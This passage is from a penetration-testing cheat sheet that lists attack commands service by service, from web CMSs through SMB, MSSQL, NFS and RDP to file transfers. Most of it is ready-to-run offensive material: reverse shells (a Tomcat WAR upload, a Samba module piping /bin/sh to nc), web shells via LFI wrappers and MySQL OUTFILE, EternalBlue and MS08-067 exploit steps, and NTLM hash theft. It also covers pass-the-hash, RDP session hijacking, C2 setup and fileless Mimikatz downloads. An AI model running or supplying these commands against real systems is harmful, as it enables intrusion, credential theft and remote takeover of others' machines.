droopescan scan -u <URL>
```

#### Username enumeration

```
In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/<number> you can see the number of existing users :
	- /user/1 -> Access denied (user exist)
	- /user/2 -> Page not found (user doesn't exist)
```

#### Hidden pages enumeration

```
Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
```

#### Drupal panel RCE

```
You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -> (Check) PHP Filter  -> Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
```

### Joomla

#### Enumeration - Joomla 
```
joomscan -u <URL>
./joomlavs.rb --url <URL> -a -v

Version
In /administrator/manifests/files/joomla.xml  
In /language/en-GB/en-GB.xml 
In plugins/system/cache/cache.xml 
```
#### Joomla DB leak/unauthorised Cred exposure
```
Joomla 4.x > 4.2.7 are known to be vulnerable to unauthorised sensitive data exposure.  (CVE-2023-23762)
This can be used to bypass auth on api endpoint allowing an attacker to leak priv information.  
/api/index.php/v1/config/application?public=true

Can be changed to RCE (https://vulncheck.com/blog/joomla-for-rce) 

Further able to leak user database.  This doesn't include passwords or hash, however useful for bruteforce. 

```

### Tomcat

#### Default credentials

```
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

#### Brute force 

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
```

#### Tomcat panel RCE

```
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Upload payload
Tomcat6 :
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener
nc -lvp <PORT>

# Execute payload
curl http://<IP>:8080/shell/
```

### WebDav

```
davtest -url <URL>
```

### HTTP brute force authentication

#### HTTP basic authentication

```
# Hydra
hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15

# Patator
python patator.py http_fuzz auth_type=basic url=<URL> user_pass=FILE0 0=<USER:PASSWORD_LIST> -x ignore:code=401 -x ignore:code=307
```

#### HTTP GET request

```
hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
```

#### HTTP POST request

```
hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>
```

### Spidering / Brute force directories / files

```
gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>

ffuf -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>

ffuf -u http://x.x.x.x -w /usr/share/wordlist -H 'Host: FUZZ.x' --fl LINENUMBERtofilter --mc all

Run once to get lines. Adjust --fl variable to get rid of lines
	-u url
	-w wordlist
	-H Header to enumerate
	--fl filter response line  
	--mc matchcode

dirbuster

wfuzz -u http://x.x.x.x -w /op/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.x' --hl LINE

Run once to get lines to hide, adjust hl 

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### File backups

Once you have found all the files, look for backups of all the executable files ("*.php*", "*.aspx*"...). Common variations for naming a backup are 

```
file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
```

### Local File Inclusion / Remote File Inclusion - LFI / RFI

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

#### Wrappers

##### Wrapper php://filter

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
```

##### Wrapper expect://

```
http://example.com/index.php?page=expect://id
```

##### Wrapper data://

```
echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
	- exec
	- shell_exec
	- system
	- passthru
	- popen

# Exemple
echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
```

##### Wrapper input://

```
curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
```

#### Useful LFI list

```
# Linux
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Both
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
```

#### Tools

```
kadimus --url <URL>
python lfisuite.py
```

### Command injection

For command injection always use BurpSuite !

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
```

### Deserialization

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
```

### File upload

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
```

### SQL injection

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
```

### XSS

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

beef-xss
cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
<script src="http://<IP>:3000/hook.js"></script>

url=%26%2302java%26%23115cript:alert(document.domain)
```

### Other web vulnerabilities

```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

### Upload a file with PUT

```
curl -X PUT http://<IP>/<FILE> -d @<FILE>  -v
```

------

## KERBEROS - 88

```
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
```

------

## POP3/IMAP - 110

### Brute force 

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

### Read mail

```
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT
```

|**Command**|**Description**||
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. ||
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. ||
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. ||
| `curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd` | Connect to the IMAPS service. ||


| **Section**| **Code**| **Code** |
|------------------------------- |---------------------------------|-------------------------------------------|
| Login                          | `A1 LOGIN username password`    | Values can be quoted to enclose spaces and special characters. A " must then be escaped with a \ |
| Login                          | `A1 LOGIN "username" "pass word"`| |
| List Folders/Mailboxes         | `A1 LIST "" *`                  | `A1 LIST INBOX *`                          |
| List Folders/Mailboxes         | `A1 LIST "Archive" *`           | |
| Create new Folder/Mailbox      | `A1 CREATE INBOX.Archive.2012`   | `A1 CREATE "To Read"`                      |
| Delete Folder/Mailbox          | `A1 DELETE INBOX.Archive.2012`   | `A1 DELETE "To Read"`                      |
| Rename Folder/Mailbox          | `A1 RENAME "INBOX.One" "INBOX.Two"`||
| List Subscribed Mailboxes      | `A1 LSUB "" *`                   | |
| Status of Mailbox              || `A1 STATUS INBOX (MESSAGES UNSEEN RECENT)` |
| Select a mailbox               || `A1 SELECT INBOX`                          |
| List messages                  || `A1 FETCH 1:* (FLAGS)`                     |
| List messages                  || `A1 UID FETCH 1:* (FLAGS)`                 |
| Retrieve Message Content       || `A1 FETCH 2 body[text]`                    |
| Retrieve Message Content       || `A1 FETCH 2 all`                           |
| Retrieve Message Content       || `A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])` |
|Retrieve Message Content using UID ||`A fetch 1 (RFC822)`|
| Close Mailbox                  || `A1 CLOSE`                                |
| Logout                         || `A1 LOGOUT`                               |\

------

## SNMP - 161

### Brute force community string

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

```
snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
```

```
snmp-check <IP>
```

### Modifying SNMP values

```
http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
```

------

## LDAP - 389

### Scans

```
nmap -n -sV --script "ldap* and not brute"

ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep 'userPr\|svc'
ldapsearch -h <IP> -x -s base
ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

### Graphical Interface

```
jxplorer
```

------

## SMB - 445
### Useful commands

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB and to see available shares |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |
| `samrdump.py 10.129.14.128` | Impacket - Samrdump.py |
| `smbmap -H 10.129.14.128` | Enumerating SMB null session using smbmap |
| `crackmapexec smb 10.129.14.128 --shares -u '' -p ''` | Enumerating SMB null session using cme |
| [Enum4linux](https://github.com/cddmp/enum4linux-ng.git) | This tool automates many of the SMB queries, but not all, and can return a large amount of information. |
| `./enum4linux-ng.py 10.129.14.128 -A` | Enum4Linux-ng - Enumeration |

### Attacking SMB

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //10.129.14.128` | Null-session testing against the SMB service. |
| `smbmap -H 10.129.14.128` | Network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the `impacket-psexec`. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using `crackmapexec`. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using `impacket-ntlmrelayx`. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |
| `sudo responder -I ens33` | We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes. |

### SMB Manual testing

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Download all files from a directory recursively
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
```

### SMB Brute force

```
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```

### Mount a SMB share

```

sudo mount -t cifs //<IP>/<SHARE> /mnt
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /mnt

# Mount as a guest 
sudo mount -t cifs -o <permissions>,guest //<IP>/<SHARE> /mnt

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```
### Mount any 
```
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory

```
### Get a shell

```
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```
### Upload with SMBMap
```
smbmap -H <HOST> --upload '<TOBEUPLOADED>' '<PATH>/<UPLOADNAME>' 
```
### EternalBlue (MS17-010)

```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

#### Check if vulnerable

```
python eternal_checker.py <IP>
```

#### Prepare shellcodes and listeners

```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

#### Exploit

```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin

May need to run it multiple times
```

#### If this doesn't work, try this one

```
python zzz_exploit.py <IP>
```

### MS08-067

```
# Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp <PORT>

# Exploit
python ms08_067_2018.py <IP> <NUMBER> 445
```

### CVE-2017-7494

```
# Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494
```

Create a new file named poc.c :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("ping -c 3 <IP>");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start an ICMP listener
sudo tcpdump -i <INTERFACE> icmp

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start a listener
nc -lvp <PORT>

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

------

## MSSQL - 1433

|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |
| `locate mssqlclient.py` | Locate mssqlclient.py |
| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248` | NMAP MSSQL Script Scan |
| `sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*` | Scanning MySQL Server |
| `mysql -u root -pP4SSw0rd -h 10.129.14.128` | Interaction with the MySQL Server |

### Get information

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

### Having credentials

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
```

------

## NFS - 2049

|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |
| `sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049` | Nmap nsf scan |
| | |
| `mkdir target-NFS` `sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock` `cd target-NFS` `tree .` | Mounting NFS share |
| `ls -l mnt/nfs/` | List Contents with Usernames & Group Names |
| `ls -n mnt/nfs/` | List Contents with UIDs & GUIDs |
| `cd ..` `sudo umount ./target-NFS` | Unmounting |

### Show Mountable NFS Shares

```
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
```

### Mount a share

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
```

### NFS misconfigurations

```
# List exported shares
cat /etc/exports
```

If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.

```
# Attacker, as root user

mkdir <DIRECTORY>
mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
cd <DIRECTORY>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd <SHARE>
./pwn # Root shell
```

------

## MYSQL - 3306

### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
```

### Extracting MySQL credentials from files

```
cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### Connect

```
# Local
mysql -u <USER>
mysql -u <USER> -p

# Remote
mysql -h <IP> -u <USER>
```

### MySQL commands

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
```

------

## RDP - 3389

### Brute force

```
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>

hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
```

### Connect with known credentials / hash

```
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
```

### Session stealing

#### Get openned sessions

```
query user
```

#### Access to the selected 

```
tscon <ID> /dest:<SESSIONNAME>
```

### Adding user to RDP group (Windows) 

```
net localgroup "Remote Desktop Users" <USER> /add
```

### Attacking RDP 

|**Command**|**Description**|
|-|-|
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Password spraying against the RDP service. |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Brute-forcing the RDP service. |
| `rdesktop -u admin -p password123 192.168.2.143` | Connect to the RDP service using `rdesktop` in Linux. |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Impersonate a user without its password. SESSION HIJACKING |
| `net start sessionhijack` | Execute the RDP session hijack. |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host. |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |

------

## VNC - 5800 - 58001 - 5900 - 5901

### Scans

``` 
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
```

### Brute force

```
hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
```

### Connect

```
vncviewer <IP>:<PORT>
```

### Found VNC password

#### Linux

```
Default password is stored in: ~/.vnc/passwd
```

#### Windows

```
# RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

### Decrypt VNC password

```
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul
```

------

## WINRM - 5985 - 5986

### Brute force

```
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
```

### Connecting

```
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
```

------

## CGI

### Found CGI scripts

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <URL>/ccgi-bin/FUZZ -t 50
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u <URL>/ccgi-bin/FUZZ -t 50
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u <URL>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
```

If a script is found try [SHELLSHOCK](#shellshock).

------

## Command and control framework

```
# Download
git clone https://github.com/mhaskar/Octopus/tree/v1.2

# Install requirements
pip install -r requirements.txt

# Usage
./octopus.py

# Listener (exemple)
listen_http <BIND_IP> <BIND_PORT> <HOSTNAME> <INTERVAL_IN_SECONDS> <URL> <LISTENER_NAME>
listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

# Agent (exemple)
generate_powershell <LISTENER_NAME>
generate_powershell listener_1
```

------

## Compiling exploits

### For linux

```
# 64 bits
gcc -o exploit exploit.c

# 32 bits
gcc -m32 -o exploit exploit.c
```

### For windows

```
To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o <FILE.exe> <FILE.c>
To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o <FILE.exe><FILE.c>
To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o <FILE>.exe <FILE>.cpp
To compile python scripts, pyinstaller --onefile <SCRIPT.py>

# Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

### Cross compile

```
gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
```

------

## DICTIONARY GENERATION

```
cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
```

```
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
```

------

# File Transfers

### Windows File Transfer Methods

| **Command** | **Description** |
| --------------|-------------------|
| **MD and Base64 File encoding** | |
| `md5sum id_rsa` | Checks md value of a file in linux |
| `cat id_rsa \|base64 -w 0;echo` | File to base64 - encode from linux |
| `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))` | Encode File Using PowerShell |
| `echo BASE64STRING \| base64 -d > hosts` | Decode Base64 String in Linux |
| **File download in windows** | |
| `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("Base 64 string"))` | Decoding the base64 string in windows -PWSH |
| `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5` | Checking the md value of a file in windows -PWSH |
| `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')` **OR** `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') \| IEX` | PowerShell DownloadString - Fileless Method -PWSH |
| `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` | From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. -PWSH |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 \| IEX` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing. -PWSH |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command -PWSH |
| **SMB File Sharing** | |
| `sudo impacket-smbserver share -smb2support /tmp/smbshare` **OR** `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` | We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket |
| `copy \\192.168.220.133\share\nc.exe` **OR** `net use n: \\192.168.220.133\share /user:test test`| Copy a File from the SMB Server -CMD |
| **FTP File Sharing** | |
| `sudo pip3 install pyftpdlib` |  Installing the FTP Server Python3 Module - pyftpdlib |
| `sudo python3 -m pyftpdlib --port 21` | Setting up a Python3 FTP Server |
| `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')` |  Transfering Files from an FTP Server Using PowerShell |
| **PowerShell Web Uploads** | |
| `pip3 install uploadserver` | Installing a Configured WebServer with Upload |
| `python3 -m uploadserver` | Installing a Configured WebServer with Upload |
| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts` | Uploading the file using the script |
| **PowerShell Base64 Web Upload** | |
| `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))` | PowerShell Script to Upload a File to Python Upload Server |
| `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64` | Uploading the file using Powershell script |
| `nc -lvnp 8000` | We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file. |
| `echo <base64> \| base64 -d -w 0 \> hosts` | Decoding |
| **SMB Uploads** | |
| `sudo pip install wsgidav cheroot` |  Installing WebDav Python modules | 
